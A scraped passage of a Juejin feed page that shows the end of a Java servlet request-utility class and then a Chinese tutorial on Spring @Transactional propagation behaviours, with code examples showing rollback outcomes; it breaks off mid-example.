        <span class="hljs-keyword">if</span> (handlerMethod.getMethodAnnotation(ResponseBody.class) != <span class="hljs-literal">null</span> ||
                handlerMethod.getBeanType().isAnnotationPresent(ResponseBody.class)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-comment">/**
     * 渲染 JSON 数据到响应
     *
     * <span class="hljs-doctag">@param</span> response 响应对象
     * <span class="hljs-doctag">@param</span> json     JSON 字符串
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">renderJson</span><span class="hljs-params">(HttpServletResponse response, String json)</span> {
        <span class="hljs-keyword">if</span> (response == <span class="hljs-literal">null</span>) {
            log.warn(<span class="hljs-string">"HttpServletResponse 为空，跳过 JSON 渲染"</span>);
            <span class="hljs-keyword">return</span>;
        }
        Assert.notNull(json, <span class="hljs-string">"JSON 字符串不能为空"</span>);

        response.setCharacterEncoding(StandardCharsets.UTF_8.name());
        response.setContentType(MediaType.APPLICATION_JSON_VALUE);
        <span class="hljs-keyword">try</span> (<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter()) {
            writer.write(json);
            writer.flush();
        } <span class="hljs-keyword">catch</span> (IOException e) {
            log.error(<span class="hljs-string">"渲染 JSON 失败"</span>, e);
        }
    }

    <span class="hljs-comment">/**
     * 获取客户端 IP
     * &lt;p&gt;
     * 考虑了 Nginx 等反向代理的场景
     *
     * <span class="hljs-doctag">@return</span> IP 地址
     */</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getIpAddr</span><span class="hljs-params">()</span> {
        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> getRequest();
        <span class="hljs-keyword">if</span> (request == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        <span class="hljs-keyword">return</span> getIpAddr(request);
    }

    <span class="hljs-comment">/**
     * 获取客户端 IP
     *
     * <span class="hljs-doctag">@param</span> request 请求对象
     * <span class="hljs-doctag">@return</span> IP 地址
     */</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getIpAddr</span><span class="hljs-params">(HttpServletRequest request)</span> {
        <span class="hljs-keyword">if</span> (request == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">"x-forwarded-for"</span>);
        <span class="hljs-keyword">if</span> (ip == <span class="hljs-literal">null</span> || ip.isEmpty() || <span class="hljs-string">"unknown"</span>.equalsIgnoreCase(ip)) {
            ip = request.getHeader(<span class="hljs-string">"Proxy-Client-IP"</span>);
        }
        <span class="hljs-keyword">if</span> (ip == <span class="hljs-literal">null</span> || ip.isEmpty() || <span class="hljs-string">"unknown"</span>.equalsIgnoreCase(ip)) {
            ip = request.getHeader(<span class="hljs-string">"WL-Proxy-Client-IP"</span>);
        }
        <span class="hljs-keyword">if</span> (ip == <span class="hljs-literal">null</span> || ip.isEmpty() || <span class="hljs-string">"unknown"</span>.equalsIgnoreCase(ip)) {
            ip = request.getHeader(<span class="hljs-string">"HTTP_CLIENT_IP"</span>);
        }
        <span class="hljs-keyword">if</span> (ip == <span class="hljs-literal">null</span> || ip.isEmpty() || <span class="hljs-string">"unknown"</span>.equalsIgnoreCase(ip)) {
            ip = request.getHeader(<span class="hljs-string">"HTTP_X_FORWARDED_FOR"</span>);
        }
        <span class="hljs-keyword">if</span> (ip == <span class="hljs-literal">null</span> || ip.isEmpty() || <span class="hljs-string">"unknown"</span>.equalsIgnoreCase(ip)) {
            ip = request.getRemoteAddr();
        }
        <span class="hljs-comment">// 对于通过多个代理的情况，第一个IP为客户端真实IP,多个IP按照','分割</span>
        <span class="hljs-keyword">if</span> (ip != <span class="hljs-literal">null</span> &amp;&amp; ip.contains(<span class="hljs-string">","</span>)) {
            ip = ip.split(<span class="hljs-string">","</span>)[<span class="hljs-number">0</span>].trim();
        }
        <span class="hljs-keyword">return</span> ip;
    }

    <span class="hljs-comment">/**
     * 获取请求头
     *
     * <span class="hljs-doctag">@param</span> name header 名称
     * <span class="hljs-doctag">@return</span> header 值
     */</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getHeader</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> getRequest();
        <span class="hljs-keyword">return</span> request != <span class="hljs-literal">null</span> ? request.getHeader(name) : <span class="hljs-literal">null</span>;
    }

    <span class="hljs-comment">/**
     * 获取 Parameter
     *
     * <span class="hljs-doctag">@param</span> name parameter 名称
     * <span class="hljs-doctag">@return</span> parameter 值
     */</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getParameter</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> getRequest();
        <span class="hljs-keyword">return</span> request != <span class="hljs-literal">null</span> ? request.getParameter(name) : <span class="hljs-literal">null</span>;
    }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring声明式事务：@Transactional用起来简单，但传播机制你真的配明白了吗？]]></title>    <link>https://juejin.cn/post/7595772638880907315</link>    <guid>https://juejin.cn/post/7595772638880907315</guid>    <pubDate>2026-01-16T09:53:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595772638880907315" data-draft-id="7595683968684113966" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring声明式事务：@Transactional用起来简单，但传播机制你真的配明白了吗？"/> <meta itemprop="keywords" content="Java,Spring"/> <meta itemprop="datePublished" content="2026-01-16T09:53:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CV工程师的自我修养"/> <meta itemprop="url" content="https://juejin.cn/user/1039488093258619"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring声明式事务：@Transactional用起来简单，但传播机制你真的配明白了吗？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1039488093258619/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CV工程师的自我修养
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T09:53:32.000Z" title="Fri Jan 16 2026 09:53:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是一名CV工程师。</p>
<p>在使用Spring声明式事务时，你是否曾有过这样的困惑：明明标注了<code>@Transactional</code>，但事务却没按你预想的那样回滚？在复杂的业务方法嵌套调用中，事务的边界为何总像“玄学”一样难以捉摸？其实根本原因是：Spring事务的传播机制有着清晰、严谨的规则。虽然我们平时用到传播机制并不多。但是理解它，并非为了炫技，而是为了让我们能能精准控制数据一致性，也是为了在面试过程中能清楚的回答出面试官关于声明式事务传播机制的问题。</p>
<blockquote>
<p>接下来我将用代码调试的方式为大家讲解每个传播机制的区别!!!</p>
</blockquote>
<h3 data-id="heading-0">声明式事务传播机制的核心概念</h3>
<h4 data-id="heading-1">基本定义与核心概念</h4>
<p>传播机制是Spring声明式事务管理的核心特性之一，用于定义在多个事务方法相互调用时，事务应该如何传播和处理边界。特别需要注意的是传播行为是定义被调用方法的事务行为，而不是调用方法的控制手段。所以传播机制是需要定义在被调用方法上，以用来控制该方法如何与调用方的事务上下文进行交互。</p>
<h4 data-id="heading-2">七种传播传播行为区别</h4>













































<table><thead><tr><th>传播行为</th><th>行为定义</th><th>简单描述(以被调用方视角)</th></tr></thead><tbody><tr><td>REQUIRED</td><td>Spring默认的传播机制。如果当前(调用方)存在事务，则加入该事务；如果当前没有事务，则创建一个新的事务。REQUIRED传播机制最常用的情况是在一个事务重进行多个操作，要么全部成功，要么全部失败。如果其中一个操作失败，整个事务都将被回滚。</td><td>"我"需要一个事务，有就加入，没有就新建</td></tr><tr><td>SUPPORTS</td><td>当前方法如果在一个事务方法中被调用，则加入该事务；否则，已非事务的方式运行。SUPPORTS传播机制适用于对事务要求不高的操作，例如读取操作。</td><td>"我"支持事务，有就用，没有就不用</td></tr><tr><td>MANDATORY</td><td>传播机制表示当前方法必须在一个事务中被调用，否则将抛出异常。MANDATORY传播机制适用于在需要事务的情况下调用方法。</td><td>"我"必须在事务中运行，否则抛异常</td></tr><tr><td>REQUIRES_NEW</td><td>表示当前方法必须开启一个新事务运行，如果当前存在事务，则挂起该事务。REQUIRES_NEW传播机制适用于对事务要求比较高的操作，例如更新操作。REQUIRES_NEW修饰的内部方法会新开启自己的事务，且开启的事务相互独立，互不干扰。</td><td>"我"需要新事务，有就挂起旧的，没有就新建</td></tr><tr><td>NOT_SUPPORTED</td><td>以非事务方式运行，如果当前存在事务，则把当前事务挂起。</td><td>"我"不支持事务，有就挂起，没有就算了</td></tr><tr><td>NEVER</td><td>以非事务方式运行，如果当前存在事务，则抛出异常。</td><td>"我"禁止在事务中运行，否则抛异常</td></tr><tr><td>NESTED</td><td>如果当前存在事务，则创建一个事务作为当前事务的嵌套事务来运行；如果当前没有事务，则该取值等价于PROPAGATION_REQUIRED。</td><td>"我"需要嵌套事务，有就用保存点，没有就新建</td></tr></tbody></table>
<h3 data-id="heading-3">代码验证各个传播行为</h3>
<h4 data-id="heading-4">调用方使用<code>@Transactional</code>注解，被调用方没有使用</h4>
<pre><code class="hljs language-typescript" lang="typescript"> <span class="hljs-meta">@Service</span>(<span class="hljs-string">"test1Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Service</span> test2Service;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test1Mapper</span> test1Mapper;

    <span class="hljs-comment">/**
     * 调用方法
     */</span>
    <span class="hljs-meta">@Transactional</span>(rollbackFor = <span class="hljs-title class_">Exception</span>.<span class="hljs-property">class</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
        test1Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();<span class="hljs-comment">//✅更新被回滚</span>
        test2Service.<span class="hljs-title function_">update</span>();
    }
}


<span class="hljs-meta">@Service</span>(<span class="hljs-string">"test2Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test2Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Mapper</span> test2Mapper;

    <span class="hljs-comment">/**
     * 被调用方法
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>){
        test2Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();<span class="hljs-comment">//✅更新被回滚</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"模拟异常"</span>);
    }
}


<span class="hljs-comment">/**
  * 结论：被调用方法受调用方法的事务管控
  */</span>
</code></pre>
<h4 data-id="heading-5">调用方未使用<code>@Transactional</code>注解，被调用方使用</h4>
<pre><code class="hljs language-typescript" lang="typescript"> <span class="hljs-meta">@Service</span>(<span class="hljs-string">"test1Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Service</span> test2Service;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test1Mapper</span> test1Mapper;

    <span class="hljs-comment">/**
     * 调用方法
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
        test1Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();<span class="hljs-comment">//❌更新未被回滚</span>
        test2Service.<span class="hljs-title function_">update</span>();
    }
}


<span class="hljs-meta">@Service</span>(<span class="hljs-string">"test2Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test2Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Mapper</span> test2Mapper;

    <span class="hljs-comment">/**
     * 被调用方法
     */</span>
     <span class="hljs-meta">@Transactional</span>(rollbackFor = <span class="hljs-title class_">Exception</span>.<span class="hljs-property">class</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>){
        test2Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();<span class="hljs-comment">//✅更新被回滚</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"模拟异常"</span>);
    }
}


<span class="hljs-comment">/**
  * 结论：调用方法不受被调用方的事务管控，被调用方法独立使用事务。
  */</span>
</code></pre>
<h4 data-id="heading-6">被调用方法使用<code>REQUIRED</code>传播行为</h4>
<h5 data-id="heading-7">调用方法有事务</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service("test1Service")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test2Service test2Service;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test1Mapper test1Mapper;

    <span class="hljs-comment">/**
     * 调用方法
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> {
        test1Mapper.updateId1ColTo2();<span class="hljs-comment">//✅更新被回滚</span>
        test2Service.update();
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"模拟异常"</span>);
    }
}

<span class="hljs-meta">@Service("test2Service")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test2Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test2Mapper test2Mapper;

    <span class="hljs-comment">/**
     * 被调用方法
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class,propagation = Propagation.REQUIRED)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> {
        test2Mapper.updateId1ColTo2();<span class="hljs-comment">//✅更新被回滚</span>
    }
}

<span class="hljs-comment">/**
 *现象：调用方法中抛出异常，被调用方法中的更新也被回滚。
 *结论:被调用方法加入到调用方法事务中。
 */</span>
</code></pre>
<h5 data-id="heading-8">调用方法无事务</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>(<span class="hljs-string">"test1Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Service</span> test2Service;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test1Mapper</span> test1Mapper;

    <span class="hljs-comment">/**
     * 调用方法
     */</span>
<span class="hljs-comment">//    @Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
        test1Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();<span class="hljs-comment">//❌更新未被回滚</span>
        test2Service.<span class="hljs-title function_">update</span>();
    }
}

<span class="hljs-meta">@Service</span>(<span class="hljs-string">"test2Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test2Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Mapper</span> test2Mapper;

    <span class="hljs-comment">/**
     * 被调用方法
     */</span>
    <span class="hljs-meta">@Transactional</span>(rollbackFor = <span class="hljs-title class_">Exception</span>.<span class="hljs-property">class</span>,propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">REQUIRED</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
        test2Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();<span class="hljs-comment">//✅更新被回滚</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"模拟异常"</span>);
    }
}

<span class="hljs-comment">/**
 *现象：被调用方法的更新被回滚
 *结论:被调用方法的创建了新的事务
 */</span>
</code></pre>
<h4 data-id="heading-9">被调用方法使用<code>SUPPORTS</code>传播行为</h4>
<h5 data-id="heading-10">调用方法有事务</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service("test1Service")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test2Service test2Service;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test1Mapper test1Mapper;

    <span class="hljs-comment">/**
     * 调用方法
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> {
        test1Mapper.updateId1ColTo2();<span class="hljs-comment">//✅更新被回滚</span>
        test2Service.update();
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"模拟异常"</span>);
    }
}

<span class="hljs-meta">@Service("test2Service")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test2Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test2Mapper test2Mapper;

    <span class="hljs-comment">/**
     * 被调用方法
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class,propagation = Propagation.SUPPORTS)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> {
        test2Mapper.updateId1ColTo2();<span class="hljs-comment">//✅更新被回滚</span>
    }
}

<span class="hljs-comment">/**
 *现象：调用方法中抛出异常，被调用方法中的更新也被回滚。
 *结论:被调用方法加入到调用方法事务中。次情景下与REQUIRED传播行为一致。
 */</span>
</code></pre>
<h5 data-id="heading-11">调用方法无事务</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>(<span class="hljs-string">"test1Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Service</span> test2Service;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test1Mapper</span> test1Mapper;

    <span class="hljs-comment">/**
     * 调用方法
     */</span>
<span class="hljs-comment">//    @Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
        test1Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();<span class="hljs-comment">//❌更新未被回滚</span>
        test2Service.<span class="hljs-title function_">update</span>();
    }
}

<span class="hljs-meta">@Service</span>(<span class="hljs-string">"test2Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test2Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Mapper</span> test2Mapper;

    <span class="hljs-comment">/**
     * 被调用方法
     */</span>
    <span class="hljs-meta">@Transactional</span>(rollbackFor = <span class="hljs-title class_">Exception</span>.<span class="hljs-property">class</span>,propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">SUPPORTS</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
        test2Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();<span class="hljs-comment">//❌更新未被回滚</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"模拟异常"</span>);
    }
}

<span class="hljs-comment">/**
 *现象：被调用方法的更新未被回滚
 *结论:被调用方法使用SUPPORTS传播行为时，当调用方法未开启事务时，被调用方法已非事务方式运行
 */</span>
</code></pre>
<h4 data-id="heading-12">被调用方法使用<code>MANDATORY</code>传播行为</h4>
<h5 data-id="heading-13">调用方法有事务</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service("test1Service")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test2Service test2Service;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test1Mapper test1Mapper;

    <span class="hljs-comment">/**
     * 调用方法
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> {
        test1Mapper.updateId1ColTo2();<span class="hljs-comment">//✅更新被回滚</span>
        test2Service.update();
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"模拟异常"</span>);
    }
}

<span class="hljs-meta">@Service("test2Service")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test2Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test2Mapper test2Mapper;

    <span class="hljs-comment">/**
     * 被调用方法
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class,propagation = Propagation.MANDATORY)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> {
        test2Mapper.updateId1ColTo2();<span class="hljs-comment">//✅更新被回滚</span>
    }
}

<span class="hljs-comment">/**
 *现象：调用方法中抛出异常，被调用方法中的更新也被回滚。
 *结论:被调用方法加入到调用方法事务中。此情景下与REQUIRED传播行为一致。
 */</span>
</code></pre>
<h5 data-id="heading-14">调用方法无事务</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>(<span class="hljs-string">"test1Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Service</span> test2Service;

